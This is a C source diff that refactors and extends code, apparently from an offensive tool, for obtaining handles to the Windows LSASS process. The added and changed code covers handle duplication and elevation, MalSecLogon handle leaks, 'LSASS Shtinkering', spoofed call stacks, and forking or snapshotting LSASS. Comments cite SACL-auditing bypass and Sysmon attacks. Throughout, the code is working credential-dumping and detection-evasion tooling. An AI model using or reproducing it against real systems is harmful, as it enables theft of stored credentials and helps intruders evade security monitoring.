@@ -7,11 +7,14 @@
 
 #if defined(NANO) && !defined(SSP)
 
-PHANDLE_LIST find_token_handles_in_process(
+BOOL find_token_handles_in_process(
     IN DWORD process_pid,
-    IN DWORD permissions)
+    IN DWORD permissions,
+    OUT PHANDLE_LIST* phandle_list)
 {
+    BOOL ret_val = FALSE;
     BOOL success = FALSE;
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
 
     DPRINT("Finding token handles in the process with PID %ld", process_pid);
 
@@ -19,23 +22,17 @@ PHANDLE_LIST find_token_handles_in_process(
     if (!handle_list)
     {
         malloc_failed();
-        return NULL;
+        goto cleanup;
     }
 
     ULONG TokenTypeIndex = 0;
-    success = GetTypeIndexByName(TOKEN_HANDLE_TYPE, &TokenTypeIndex);
+    success = get_type_index_by_name(TOKEN_HANDLE_TYPE, &TokenTypeIndex);
     if (!success)
-    {
-        intFree(handle_list); handle_list = NULL;
-        return NULL;
-    }
+        goto cleanup;
 
-    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
-    if (!handleTableInformation)
-    {
-        intFree(handle_list); handle_list = NULL;
-        return NULL;
-    }
+    success = get_all_handles(&handleTableInformation);
+    if (!success)
+        goto cleanup;
 
     // loop over each handle
     for (ULONG j = 0; j < handleTableInformation->Count; j++)
@@ -57,23 +54,32 @@ PHANDLE_LIST find_token_handles_in_process(
         if (handle_list->Count + 1 > MAX_HANDLES)
         {
             PRINT_ERR("Too many handles, please increase MAX_HANDLES");
-            intFree(handleTableInformation); handleTableInformation = NULL;
-            intFree(handle_list); handle_list = NULL;
-            return NULL;
+            goto cleanup;
         }
         handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
     }
 
-    intFree(handleTableInformation); handleTableInformation = NULL;
+    *phandle_list = handle_list;
+    ret_val = TRUE;
     DPRINT("Found %ld handles", handle_list->Count);
-    return handle_list;
+
+cleanup:
+    if (!ret_val && handle_list)
+        intFree(handle_list);
+    if (handleTableInformation)
+        intFree(handleTableInformation);
+
+    return ret_val;
 }
 
-PHANDLE_LIST find_process_handles_in_process(
+BOOL find_process_handles_in_process(
     IN DWORD process_pid,
-    IN DWORD permissions)
+    IN DWORD permissions,
+    OUT PHANDLE_LIST* phandle_list)
 {
+    BOOL ret_val = FALSE;
     BOOL success = FALSE;
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
 
     DPRINT("Finding process handles in the process with PID %ld", process_pid);
 
@@ -81,23 +87,17 @@ PHANDLE_LIST find_process_handles_in_process(
     if (!handle_list)
     {
         malloc_failed();
-        return NULL;
+        goto cleanup;
     }
 
     ULONG ProcesTypeIndex = 0;
-    success = GetTypeIndexByName(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
+    success = get_type_index_by_name(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
     if (!success)
-    {
-        intFree(handle_list); handle_list = NULL;
-        return NULL;
-    }
+        goto cleanup;
 
-    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
-    if (!handleTableInformation)
-    {
-        intFree(handle_list); handle_list = NULL;
-        return NULL;
-    }
+    success = get_all_handles(&handleTableInformation);
+    if (!success)
+        goto cleanup;
 
     // loop over each handle
     for (ULONG j = 0; j < handleTableInformation->Count; j++)
@@ -119,16 +119,22 @@ PHANDLE_LIST find_process_handles_in_process(
         if (handle_list->Count + 1 > MAX_HANDLES)
         {
             PRINT_ERR("Too many handles, please increase MAX_HANDLES");
-            intFree(handleTableInformation); handleTableInformation = NULL;
-            intFree(handle_list); handle_list = NULL;
-            return NULL;
+            goto cleanup;
         }
         handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
     }
 
-    intFree(handleTableInformation); handleTableInformation = NULL;
+    *phandle_list = handle_list;
+    ret_val = TRUE;
     DPRINT("Found %ld handles", handle_list->Count);
-    return handle_list;
+
+cleanup:
+    if (handleTableInformation)
+        intFree(handleTableInformation);
+    if (!ret_val && handle_list)
+        intFree(handle_list);
+
+    return ret_val;
 }
 
 /*
@@ -170,11 +176,13 @@ BOOL check_handle_privs(
             "The handle should have access permissions of 0x%lx but has 0x%lx",
             permissions,
             permissions & obj_info.GrantedAccess);
+        PRINT_ERR("Could not open a handle with the requested permissions");
     }
 
 cleanup:
     return ret_val;
 }
+
 
 /*
  * "The DuplicateHandle system call has an interesting behaviour
@@ -184,7 +192,8 @@ cleanup:
  * https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
  */
 HANDLE make_handle_full_access(
-    IN HANDLE hProcess)
+    IN HANDLE hProcess,
+    IN DWORD attributes)
 {
     if (!hProcess)
         return NULL;
@@ -196,7 +205,7 @@ HANDLE make_handle_full_access(
         NtCurrentProcess(),
         &hDuped,
         0,
-        0,
+        attributes,
         DUPLICATE_SAME_ACCESS);
 
     NtClose(hProcess); hProcess = NULL;
@@ -204,24 +213,238 @@ HANDLE make_handle_full_access(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtDuplicateObject", status);
-        DPRINT_ERR("Could not convert the handle to full access privileges");
         return NULL;
     }
-
-    DPRINT("The handle now has full access privileges");
 
     return hDuped;
 }
 
+// https://codewhitesec.blogspot.com/2022/09/attacks-on-sysmon-revisited-sysmonente.html
+HANDLE elevate_handle_via_duplicate(
+    IN HANDLE hProcess,
+    IN ACCESS_MASK DesiredAccess,
+    IN DWORD HandleAttributes)
+{
+    HANDLE hDupPriv = NULL;
+    HANDLE hHighPriv = NULL;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    ULONG options = 0;
+
+    if (!hProcess)
+        goto cleanup;
+
+    if (!DesiredAccess)
+        options = DUPLICATE_SAME_ACCESS;
+
+    status = NtDuplicateObject(
+        NtCurrentProcess(),
+        hProcess,
+        NtCurrentProcess(),
+        &hDupPriv,
+        PROCESS_DUP_HANDLE,
+        FALSE,
+        0);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtDuplicateObject", status);
+        goto cleanup;
+    }
+
+    status = NtDuplicateObject(
+        hDupPriv,
+        NtCurrentProcess(),
+        NtCurrentProcess(),
+        &hHighPriv,
+        DesiredAccess,
+        HandleAttributes,
+        options);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtDuplicateObject", status);
+        goto cleanup;
+    }
+
+    DPRINT(
+        "Duplicated handle: 0x%lx -> 0x%lx",
+        (DWORD)(ULONG_PTR)hProcess,
+        (DWORD)(ULONG_PTR)hHighPriv);
+
+cleanup:
+    if (hProcess)
+        NtClose(hProcess);
+    if (hDupPriv)
+        NtClose(hDupPriv);
+
+    return hHighPriv;
+}
+
 // get a handle to LSASS via multiple methods
-HANDLE obtain_lsass_handle(
+BOOL obtain_lsass_handle(
+    OUT PHANDLE phProcess,
+    IN DWORD lsass_pid,
+    IN BOOL duplicate_handle,
+    IN BOOL elevate_handle,
+    IN BOOL duplicate_elevate,
+    IN BOOL use_seclogon_duplicate,
+    IN DWORD spoof_callstack,
+    IN BOOL is_seclogon_leak_local_stage_2,
+    IN LPCSTR seclogon_leak_remote_binary,
+    OUT PPROCESS_LIST* Pcreated_processes,
+    IN BOOL use_valid_sig,
+    IN LPCSTR dump_path,
+    IN BOOL fork_lsass,
+    IN BOOL snapshot_lsass,
+    OUT PHANDLE PhSnapshot,
+    IN BOOL use_seclogon_leak_local,
+    IN BOOL use_seclogon_leak_remote,
+    IN BOOL use_lsass_shtinkering)
+{
+    BOOL   ret_val               = FALSE;
+    BOOL   success               = FALSE;
+    HANDLE hProcess              = NULL;
+    DWORD  permissions           = LSASS_DEFAULT_PERMISSIONS;
+    DWORD  duplicate_permissions = 0;
+    DWORD  attributes            = 0;
+    BOOL   use_seclogon_leak     = use_seclogon_leak_local || use_seclogon_leak_remote;
+
+    if (!phProcess)
+        return FALSE;
+
+    // --duplicate-elevate is simply --duplicate and --elevate-handle used together
+    if (duplicate_elevate)
+    {
+        elevate_handle = TRUE;
+        duplicate_handle = TRUE;
+    }
+
+    if (use_seclogon_leak && !is_seclogon_leak_local_stage_2)
+    {
+        success = malseclogon_handle_leak(
+            seclogon_leak_remote_binary,
+            dump_path,
+            fork_lsass,
+            snapshot_lsass,
+            use_valid_sig,
+            use_lsass_shtinkering,
+            use_seclogon_leak_local,
+            lsass_pid,
+            Pcreated_processes);
+        if (!success)
+            goto cleanup;
+        if (use_seclogon_leak_local)
+            return TRUE;
+    }
+
+    // --seclogon-leak-remote requires --duplicate internaly
+    if (use_seclogon_leak_remote)
+        duplicate_handle = TRUE;
+
+    // LSASS Shtinkering needs the handle to be inheritable
+    if (use_lsass_shtinkering)
+        attributes |= OBJ_INHERIT;
+
+    // fork and snapshot require LSASS_CLONE_PERMISSIONS
+    if ((fork_lsass || snapshot_lsass) && !use_seclogon_leak)
+    {
+        permissions = LSASS_CLONE_PERMISSIONS;
+    }
+    // shtinkering requires LSASS_SHTINKERING_PERMISSIONS
+    else if (use_lsass_shtinkering)
+    {
+        permissions = LSASS_SHTINKERING_PERMISSIONS;
+    }
+
+    // remember the permissions we needed
+    duplicate_permissions = permissions;
+
+    // if --elevate-handle was provided, we use PROCESS_QUERY_LIMITED_INFORMATION
+    if (elevate_handle)
+    {
+        permissions = PROCESS_QUERY_LIMITED_INFORMATION;
+    }
+
+    hProcess = open_handle_to_lsass(
+        lsass_pid,
+        permissions,
+        duplicate_handle,
+        use_seclogon_duplicate,
+        spoof_callstack,
+        is_seclogon_leak_local_stage_2,
+        attributes);
+    if (!hProcess)
+        goto cleanup;
+
+    success = check_handle_privs(hProcess, permissions);
+    if (!success)
+        goto cleanup;
+
+    if (elevate_handle)
+    {
+        hProcess = elevate_handle_via_duplicate(
+            hProcess,
+            duplicate_permissions,
+            attributes);
+        if (!hProcess)
+            goto cleanup;
+
+        success = check_handle_privs(hProcess, duplicate_permissions);
+        if (!success)
+            goto cleanup;
+    }
+    else if ((fork_lsass || snapshot_lsass || use_lsass_shtinkering)
+            && use_seclogon_leak)
+    {
+        hProcess = make_handle_full_access(
+            hProcess,
+            attributes);
+        if (!hProcess)
+            goto cleanup;
+
+        success = check_handle_privs(hProcess, duplicate_permissions);
+        if (!success)
+            goto cleanup;
+    }
+
+    // avoid reading LSASS directly by making a fork
+    if (fork_lsass)
+    {
+        hProcess = fork_process(
+            hProcess,
+            attributes);
+        if (!hProcess)
+            goto cleanup;
+    }
+
+    // avoid reading LSASS directly by making a snapshot
+    if (snapshot_lsass)
+    {
+        hProcess = snapshot_process(
+            hProcess,
+            PhSnapshot);
+        if (!hProcess)
+            goto cleanup;
+    }
+
+    ret_val = TRUE;
+
+    *phProcess = hProcess;
+
+cleanup:
+    if (!ret_val && hProcess)
+        NtClose(hProcess);
+
+    return ret_val;
+}
+
+
+HANDLE open_handle_to_lsass(
     IN DWORD lsass_pid,
     IN DWORD permissions,
     IN BOOL dup,
     IN BOOL seclogon_race,
     IN DWORD spoof_callstack,
     IN BOOL is_malseclogon_stage_2,
-    IN LPCSTR dump_path)
+    IN DWORD attributes)
 {
     HANDLE hProcess = NULL;
     // use MalSecLogon to leak a handle to LSASS
@@ -229,8 +452,7 @@ HANDLE obtain_lsass_handle(
     {
         // this is always done from an EXE
 #ifdef EXE
-        hProcess = malseclogon_stage_2(
-            dump_path);
+        hProcess = malseclogon_stage_2();
 #endif
     }
     // duplicate an existing handle to LSASS
@@ -239,18 +461,23 @@ HANDLE obtain_lsass_handle(
         DPRINT("Trying to find an existing " LSASS " handle to duplicate");
         hProcess = duplicate_lsass_handle(
             lsass_pid,
-            permissions);
+            permissions,
+            attributes);
     }
     else if (seclogon_race)
     {
-        hProcess = malseclogon_race_condition(lsass_pid);
+        hProcess = malseclogon_race_condition(
+            lsass_pid,
+            permissions,
+            attributes);
     }
     else if (spoof_callstack)
     {
         hProcess = open_handle_with_spoofed_callstack(
             spoof_callstack,
             lsass_pid,
-            permissions);
+            permissions,
+            attributes);
     }
     // good old NtOpenProcess
     else if (lsass_pid)
@@ -259,7 +486,8 @@ HANDLE obtain_lsass_handle(
         hProcess = get_process_handle(
             lsass_pid,
             permissions,
-            FALSE);
+            FALSE,
+            attributes);
     }
     // use NtGetNextProcess until a handle to LSASS is obtained
     else
@@ -268,7 +496,8 @@ HANDLE obtain_lsass_handle(
         // this branch won't be called
         DPRINT("Using NtGetNextProcess to get a handle to " LSASS);
         hProcess = find_lsass(
-            permissions);
+            permissions,
+            attributes);
     }
     if (hProcess)
     {
@@ -279,7 +508,8 @@ HANDLE obtain_lsass_handle(
 
 // use NtGetNextProcess to get a handle to LSASS
 HANDLE find_lsass(
-    IN DWORD dwFlags)
+    IN DWORD dwFlags,
+    IN DWORD attributes)
 {
     HANDLE hProcess = NULL;
     NTSTATUS status;
@@ -289,7 +519,7 @@ HANDLE find_lsass(
         status = NtGetNextProcess(
             hProcess,
             dwFlags,
-            0,
+            attributes,
             0,
             &hProcess);
         if (status == STATUS_NO_MORE_ENTRIES)
@@ -312,7 +542,8 @@ HANDLE find_lsass(
 HANDLE get_process_handle(
     IN DWORD dwPid,
     IN DWORD dwFlags,
-    IN BOOL quiet)
+    IN BOOL quiet,
+    IN DWORD attributes)
 {
     NTSTATUS status;
     HANDLE hProcess = NULL;
@@ -321,7 +552,7 @@ HANDLE get_process_handle(
     InitializeObjectAttributes(
         &ObjectAttributes,
         NULL,
-        0,
+        attributes,
         NULL,
         NULL);
     CLIENT_ID uPid = { 0 };
@@ -366,17 +597,21 @@ HANDLE get_process_handle(
 }
 
 // get all handles in the system
-PSYSTEM_HANDLE_INFORMATION get_all_handles(VOID)
+BOOL get_all_handles(
+    OUT PSYSTEM_HANDLE_INFORMATION* phandle_table)
 {
-    NTSTATUS status;
+    BOOL ret_val = FALSE;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
     ULONG buffer_size = sizeof(SYSTEM_HANDLE_INFORMATION);
-    PVOID handleTableInformation = intAlloc(buffer_size);
+    PVOID handleTableInformation = NULL;
+
+    handleTableInformation = intAlloc(buffer_size);
     if (!handleTableInformation)
     {
         malloc_failed();
-        DPRINT_ERR("Could not get all handles");
-        return NULL;
+        goto cleanup;
     }
+
     while (TRUE)
     {
         //get information of all the existing handles
@@ -393,21 +628,27 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(VOID)
             if (!handleTableInformation)
             {
                 malloc_failed();
-                DPRINT_ERR("Could not get all handles");
-                return NULL;
+                goto cleanup;
             }
             continue;
         }
         if (!NT_SUCCESS(status))
         {
             syscall_failed("NtQuerySystemInformation", status);
-            DPRINT_ERR("Could not get all handles");
-            intFree(handleTableInformation); handleTableInformation = NULL;
-            return NULL;
+            goto cleanup;
         }
-        DPRINT("Obtained the handle table");
-        return handleTableInformation;
+        break;
     }
+
+    *phandle_table = (PSYSTEM_HANDLE_INFORMATION)handleTableInformation;
+    ret_val = TRUE;
+    DPRINT("Obtained the handle table");
+
+cleanup:
+    if (!ret_val && handleTableInformation)
+        intFree(handleTableInformation);
+
+    return ret_val;
 }
 
 // check if a PID is included in the process list
@@ -424,15 +665,18 @@ BOOL process_is_included(
 }
 
 // obtain a list of PIDs from a handle table
-PPROCESS_LIST get_processes_from_handle_table(
-    IN PSYSTEM_HANDLE_INFORMATION handleTableInformation)
+BOOL get_processes_from_handle_table(
+    IN PSYSTEM_HANDLE_INFORMATION handleTableInformation,
+    OUT PPROCESS_LIST* pprocess_list)
 {
-    PPROCESS_LIST process_list = intAlloc(sizeof(PROCESS_LIST));
+    BOOL ret_val = FALSE;
+    PPROCESS_LIST process_list = NULL;
+
+    process_list = intAlloc(sizeof(PROCESS_LIST));
     if (!process_list)
     {
         malloc_failed();
-        DPRINT_ERR("Could not get the processes from the handle table");
-        return NULL;
+        goto cleanup;
     }
 
     PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo;
@@ -445,32 +689,40 @@ PPROCESS_LIST get_processes_from_handle_table(
             if (process_list->Count + 1 > MAX_PROCESSES)
             {
                 PRINT_ERR("Too many processes, please increase MAX_PROCESSES");
-                intFree(process_list); process_list = NULL;
-                return NULL;
+                goto cleanup;
             }
             process_list->ProcessId[process_list->Count++] = handleInfo->UniqueProcessId;
         }
     }
+
+    *pprocess_list = process_list;
+    ret_val = TRUE;
+
     DPRINT(
         "Enumerated %ld handles from %ld processes",
         handleTableInformation->Count,
         process_list->Count);
-    return process_list;
+
+cleanup:
+    if (!ret_val && process_list)
+        intFree(process_list);
+
+    return ret_val;
 }
 
 // call NtQueryObject with ObjectTypesInformation
-POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(VOID)
+POBJECT_TYPES_INFORMATION query_object_types_info(VOID)
 {
-    NTSTATUS status;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
     ULONG BufferLength = 0x1000;
-    POBJECT_TYPES_INFORMATION obj_type_information;
+    POBJECT_TYPES_INFORMATION obj_type_information = NULL;
+
     do
     {
         obj_type_information = intAlloc(BufferLength);
         if (!obj_type_information)
         {
             malloc_failed();
-            DPRINT_ERR("Could not obtain the different types of objects");
             return NULL;
         }
 
@@ -490,24 +742,21 @@ POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(VOID)
     } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
     syscall_failed("NtQueryObject", status);
-    DPRINT_ERR("Could not obtain the different types of objects");
     return NULL;
 }
 
 // get index of object type 'Process'
-BOOL GetTypeIndexByName(
+BOOL get_type_index_by_name(
     IN LPWSTR handle_type,
     OUT PULONG ProcesTypeIndex)
 {
-    POBJECT_TYPES_INFORMATION ObjectTypes;
-    POBJECT_TYPE_INFORMATION_V2 CurrentType;
+    BOOL ret_val = FALSE;
+    POBJECT_TYPES_INFORMATION ObjectTypes = NULL;
+    POBJECT_TYPE_INFORMATION_V2 CurrentType = NULL;
 
-    ObjectTypes = QueryObjectTypesInfo();
+    ObjectTypes = query_object_types_info();
     if (!ObjectTypes)
-    {
-        DPRINT_ERR("Could not find the index of type 'Process'");
-        return FALSE;
-    }
+        goto cleanup;
 
     CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
     for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++)
@@ -515,47 +764,60 @@ BOOL GetTypeIndexByName(
         if (!_wcsicmp(CurrentType->TypeName.Buffer, handle_type))
         {
             *ProcesTypeIndex = i + 2;
-            DPRINT("Found the index of type '%ls': %ld", handle_type, i+2);
-            intFree(ObjectTypes); ObjectTypes = NULL;
-            return TRUE;
+            ret_val = TRUE;
+            DPRINT("Found the index of type '%ls': %ld", handle_type, i + 2);
+            goto cleanup;
         }
         CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
     }
-    DPRINT_ERR("Index of type 'Process' not found");
-    intFree(ObjectTypes); ObjectTypes = NULL;
-    return FALSE;
+
+    DPRINT_ERR("Index of type '%ls' not found", handle_type);
+
+cleanup:
+    if (ObjectTypes)
+        intFree(ObjectTypes);
+
+    return ret_val;
 }
 
 // find and duplicate a handle to LSASS
 HANDLE duplicate_lsass_handle(
     IN DWORD lsass_pid,
-    IN DWORD permissions)
+    IN DWORD permissions,
+    IN DWORD attributes)
 {
-    NTSTATUS status;
-    BOOL success;
-
+    BOOL ret_val = FALSE;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    BOOL success = FALSE;
+    HANDLE duplicated_handle = NULL;
+    HANDLE hProcess = NULL;
+    HANDLE hDuped = NULL;
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
+    PPROCESS_LIST process_list = NULL;
+    ULONG ProcessId = 0;
+    DWORD local_pid = 0;
     ULONG ProcesTypeIndex = 0;
-    success = GetTypeIndexByName(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
+
+    success = get_type_index_by_name(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
     if (!success)
-        return NULL;
+        goto cleanup;
 
-    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
-    if (!handleTableInformation)
-        return NULL;
+    success = get_all_handles(&handleTableInformation);
+    if (!success)
+        goto cleanup;
 
-    PPROCESS_LIST process_list = get_processes_from_handle_table(handleTableInformation);
-    if (!process_list)
-    {
-        intFree(handleTableInformation); handleTableInformation = NULL;
-        return NULL;
-    }
+    success = get_processes_from_handle_table(
+        handleTableInformation,
+        &process_list);
+    if (!success)
+        goto cleanup;
 
-    DWORD local_pid = (DWORD)READ_MEMLOC(CID_OFFSET);
+    local_pid = (DWORD)READ_MEMLOC(CID_OFFSET);
 
     // loop over each ProcessId
-    for (ULONG i = 0; i < process_list->Count; i++)
+    for (ULONG i = 0; !ret_val && i < process_list->Count; i++)
     {
-        ULONG ProcessId = process_list->ProcessId[i];
+        ProcessId = process_list->ProcessId[i];
 
         if (ProcessId == local_pid)
             continue;
@@ -567,7 +829,7 @@ HANDLE duplicate_lsass_handle(
             continue;
 
         // we will open a handle to this ProcessId later on
-        HANDLE hProcess = NULL;
+        hProcess = NULL;
 
         // loop over each handle of this ProcessId
         for (ULONG j = 0; j < handleTableInformation->Count; j++)
@@ -592,20 +854,21 @@ HANDLE duplicate_lsass_handle(
                 hProcess = get_process_handle(
                     ProcessId,
                     PROCESS_DUP_HANDLE,
-                    TRUE);
+                    TRUE,
+                    0);
                 if (!hProcess)
                     break;
             }
 
             // duplicate the handle
-            HANDLE hDuped = NULL;
+            hDuped = NULL;
             status = NtDuplicateObject(
                 hProcess,
                 (HANDLE)(DWORD_PTR)handleInfo->HandleValue,
                 NtCurrentProcess(),
                 &hDuped,
                 0,
-                0,
+                attributes,
                 DUPLICATE_SAME_ACCESS);
             if (!NT_SUCCESS(status))
                 continue;
@@ -617,10 +880,9 @@ HANDLE duplicate_lsass_handle(
                     "Found " LSASS " handle: 0x%x, on process: %d",
                     handleInfo->HandleValue,
                     handleInfo->UniqueProcessId);
-                intFree(handleTableInformation); handleTableInformation = NULL;
-                intFree(process_list); process_list = NULL;
-                NtClose(hProcess); hProcess = NULL;
-                return hDuped;
+                ret_val = TRUE;
+                duplicated_handle = hDuped;
+                break;
             }
             NtClose(hDuped); hDuped = NULL;
         }
@@ -630,26 +892,44 @@ HANDLE duplicate_lsass_handle(
         }
     }
 
-    PRINT_ERR("No handle to the " LSASS " process was found");
-    intFree(handleTableInformation); handleTableInformation = NULL;
-    intFree(process_list); process_list = NULL;
-    return NULL;
+    if (!ret_val)
+    {
+        PRINT_ERR("No handle to the " LSASS " process was found");
+    }
+
+cleanup:
+    if (handleTableInformation)
+        intFree(handleTableInformation);
+    if (process_list)
+        intFree(process_list);
+    if (hProcess)
+        NtClose(hProcess);
+
+    if (ret_val)
+        return duplicated_handle;
+    else
+        return NULL;
 }
 
 // create a clone (fork) of the LSASS process
 HANDLE fork_process(
-    IN HANDLE hProcess)
+    IN HANDLE hProcess,
+    IN DWORD attributes)
 {
     if (!hProcess)
         return NULL;
 
     // fork the LSASS process
     HANDLE hCloneProcess = NULL;
+    OBJECT_ATTRIBUTES attrs = { 0 };
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
 
-    NTSTATUS status = NtCreateProcessEx(
+    InitializeObjectAttributes(&attrs, NULL, attributes, 0, NULL);
+
+    status = NtCreateProcessEx(
         &hCloneProcess,
         GENERIC_ALL,
-        NULL,
+        &attrs,
         hProcess,
         CREATE_SUSPENDED,
         NULL,
@@ -659,7 +939,6 @@ HANDLE fork_process(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateProcessEx", status);
-        DPRINT_ERR("Could not fork " LSASS);
         hCloneProcess = NULL;
     }
     else
@@ -678,15 +957,16 @@ HANDLE snapshot_process(
     IN HANDLE hProcess,
     OUT PHANDLE hSnapshot)
 {
+    BOOL ret_val = FALSE;
     PssNtCaptureSnapshot_t PssNtCaptureSnapshot;
-    PssNtQuerySnapshot_t   PssNtQuerySnapshot;
-    HANDLE                 hCloneProcess = NULL;
-    DWORD                  process_flags;
-    DWORD                  thread_flags;
-    DWORD                  error_code;
+    PssNtQuerySnapshot_t PssNtQuerySnapshot;
+    HANDLE hCloneProcess = NULL;
+    DWORD process_flags = 0;
+    DWORD thread_flags = 0;
+    DWORD error_code = 0;
 
-    if (!hProcess)
-        return NULL;
+    if (!hProcess || !hSnapshot)
+        goto cleanup;
 
     // find the address of PssNtCaptureSnapshot dynamically
     PssNtCaptureSnapshot = (PssNtCaptureSnapshot_t)(ULONG_PTR)get_function_address(
@@ -696,7 +976,7 @@ HANDLE snapshot_process(
     if (!PssNtCaptureSnapshot)
     {
         api_not_found("PssNtCaptureSnapshot");
-        return NULL;
+        goto cleanup;
     }
 
     *hSnapshot    = NULL;
@@ -714,8 +994,9 @@ HANDLE snapshot_process(
     if (error_code != ERROR_SUCCESS)
     {
         DPRINT_ERR("Could not create a snapshot of " LSASS ", error: 0x%lx", error_code);
-        return NULL;
+        goto cleanup;
     }
+
     DPRINT(
         "Created a snapshot of the " LSASS " process, snapshot handle: 0x%lx",
         (DWORD)(ULONG_PTR)*hSnapshot);
@@ -728,7 +1009,7 @@ HANDLE snapshot_process(
     if (!PssNtQuerySnapshot)
     {
         api_not_found("PssNtQuerySnapshot");
-        return NULL;
+        goto cleanup;
     }
 
     error_code = PssNtQuerySnapshot(
@@ -739,21 +1020,35 @@ HANDLE snapshot_process(
     if (error_code != ERROR_SUCCESS)
     {
         DPRINT_ERR("Could not query the snapshot of " LSASS ", error: 0x%lx", error_code);
-        return NULL;
+        goto cleanup;
     }
+
+    ret_val = TRUE;
+
     DPRINT(
         "Got a handle to the snapshot process: 0x%lx",
         (DWORD)(ULONG_PTR)hCloneProcess);
 
-    return hCloneProcess;
+cleanup:
+    if (hProcess)
+        NtClose(hProcess);
+    if (!ret_val && *hSnapshot)
+        NtClose(*hSnapshot);
+    if (!ret_val && hCloneProcess)
+        NtClose(hCloneProcess);
+
+    if (ret_val)
+        return hCloneProcess;
+    else
+        return NULL;
 }
 
 // frees a snapshot of the LSASS process
 BOOL free_snapshot(
     IN HANDLE hSnapshot)
 {
-    PssNtFreeSnapshot_t PssNtFreeSnapshot;
-    DWORD               error_code;
+    PssNtFreeSnapshot_t PssNtFreeSnapshot = NULL;
+    DWORD error_code = 0;
 
     if (!hSnapshot)
         return TRUE;
